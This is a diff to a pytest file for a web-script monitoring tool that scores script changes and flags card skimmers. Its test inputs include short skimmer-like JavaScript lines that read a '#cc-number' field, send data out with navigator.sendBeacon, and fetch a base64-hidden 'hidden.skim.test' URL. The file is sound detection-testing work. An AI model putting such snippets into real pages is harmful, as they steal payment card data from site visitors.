@@ -2,12 +2,14 @@
 
 from __future__ import annotations
 
+import base64
 import hashlib
 
 import pytest
 
 from script_sentinel import changes
 from script_sentinel.changes import (
+    Assessment,
     KnownBlock,
     SeenBlock,
     added_severity,
@@ -19,8 +21,10 @@ from script_sentinel.changes import (
     raise_severity,
     references,
     severity_at_least,
+    suspicious_severity,
 )
 from script_sentinel.db.models import Severity
+from script_sentinel.heuristics import Context, Verdict
 from script_sentinel.jstokens import normalized_sha384
 
 
@@ -146,8 +150,10 @@ def test_entropy_only_counts_for_bodies_of_a_kilobyte() -> None:
     assert big.entropy_rose
     assert not big.grew_sharply
     assessment = change_severity(big, cosmetic=False, reverted=False, payment_page=False)
-    assert assessment.severity is Severity.MEDIUM
     assert any(r.startswith("entropy rose by") for r in assessment.reasons)
+    # The entropy rule alone says medium; the heuristics see eval(atob(...)) and say high.
+    assert assessment.severity is Severity.HIGH
+    assert "runs code it decodes first" in assessment.reasons
     small = analyze_change("aaaa();", "q(1,2,3,'xyz');")
     assert small.entropy_delta > changes.ENTROPY_RISE_BITS
     assert not small.entropy_rose
@@ -236,3 +242,58 @@ def test_similarity_is_skipped_for_huge_pages(monkeypatch: pytest.MonkeyPatch) -
     edited = LAYER.replace("'checkout'", "'checkout-v2'")
     # Without the similarity step, the edited block keeps its own position.
     assert match_inline_blocks(known, [_seen(1, edited)]) == [1]
+
+
+def _verdict(severity: Severity, reason: str = "reason") -> Verdict:
+    return Verdict("rule", severity, reason, (("rule", "key"),))
+
+
+def test_suspicious_severity() -> None:
+    assert suspicious_severity([], payment_page=True) is None
+    assert suspicious_severity([_verdict(Severity.MEDIUM)], payment_page=True) is None
+    found = suspicious_severity(
+        [_verdict(Severity.HIGH, "reads card fields"), _verdict(Severity.MEDIUM, "packed")],
+        payment_page=True,
+    )
+    assert found == Assessment(
+        Severity.CRITICAL,
+        (
+            "found on the page's first scan",
+            "reads card fields",
+            "packed",
+            "runs on a payment page",
+        ),
+    )
+    assert suspicious_severity([_verdict(Severity.HIGH)], payment_page=False) == Assessment(
+        Severity.HIGH, ("found on the page's first scan", "reason")
+    )
+
+
+def test_verdicts_raise_added_and_changed_scripts() -> None:
+    added = added_severity(
+        inline=True, new_host=False, payment_page=False, verdicts=[_verdict(Severity.HIGH, "v")]
+    )
+    assert added == Assessment(Severity.HIGH, ("a new inline script", "v"))
+    old = "track();"
+    new = 'track(); q("#cc-number"); navigator.sendBeacon("https://own.test/c", d);'
+    trusted = analyze_change(old, new, context=Context(script_host="own.test"))
+    assert trusted.verdicts == []
+    assert [s.rule for s in trusted.signals_added] == ["collect.card_field", "exfil.beacon"]
+    elsewhere = analyze_change(old, new)
+    assert [v.rule for v in elsewhere.verdicts] == ["skimmer.card_data"]
+    assessment = change_severity(elsewhere, cosmetic=False, reverted=True, payment_page=False)
+    # Going back to an earlier body skips the host rule, but not the heuristics.
+    assert assessment.severity is Severity.HIGH
+    assert assessment.reasons[-1].startswith("reads payment card fields (cc-number)")
+    detail = elsewhere.to_dict()
+    assert detail["verdicts"][0]["rule"] == "skimmer.card_data"
+    assert len(detail["signals_added"]) == 2
+
+
+def test_hidden_hosts_count_as_referenced_hosts() -> None:
+    hidden = base64.b64encode(b"https://hidden.skim.test/c").decode()
+    analysis = analyze_change("a();", f'a(); fetch(atob("{hidden}"));')
+    assert analysis.hosts_added == ["hidden.skim.test"]
+    assert analysis.urls_added == []  # not written out anywhere
+    back = analyze_change(f'a(); fetch(atob("{hidden}"));', "a();")
+    assert back.hosts_removed == ["hidden.skim.test"]
